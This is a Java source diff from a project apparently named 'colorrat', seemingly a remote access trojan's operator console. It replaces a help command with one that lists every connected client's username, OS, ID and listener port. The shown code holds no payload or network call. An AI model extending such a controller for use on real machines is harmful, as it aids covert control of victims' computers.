@@ -2,6 +2,7 @@ package eu.aragonapp.colorrat.command.types;
 
 import eu.aragonapp.colorrat.ColorServer;
 import eu.aragonapp.colorrat.command.Command;
+import eu.aragonapp.colorrat.network.NetworkConnection;
 
 /**
  * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
@@ -12,32 +13,30 @@ import eu.aragonapp.colorrat.command.Command;
  * You may obtain a copy of the License at
  * @https://www.apache.org/licenses/LICENSE-2.0
  */
-public class HelpCommand implements Command {
+public class ListCommand implements Command {
 
     @Override
     public boolean execute(String[] args) {
-        if (args.length == 0) {
-            ColorServer.getLogger().info("A list of all commands: ");
-            for(Command command : ColorServer.getInstance().getCommandManager().getCommands())
-                ColorServer.getLogger().info("- " + command.usage() + " » " + command.description());
-            return true;
+        ColorServer.getLogger().info("A list of all clients: ");
+        for (NetworkConnection connection : ColorServer.getInstance().getClients()) {
+            ColorServer.getLogger().info("- " + connection.getUsername() + ", " + connection.getOs() +  " (" + connection.getUid() +  ") » " + connection.getListener().getPort());
         }
-        return false;
+        return true;
     }
 
     @Override
     public String description() {
-        return "Shows a list of all commands, which you can use";
+        return "Shows a list of all connected clients with the listener port";
     }
 
     @Override
     public String usage() {
-        return "help";
+        return "list";
     }
 
     @Override
     public String name() {
-        return "help";
+        return "list";
     }
 
 }
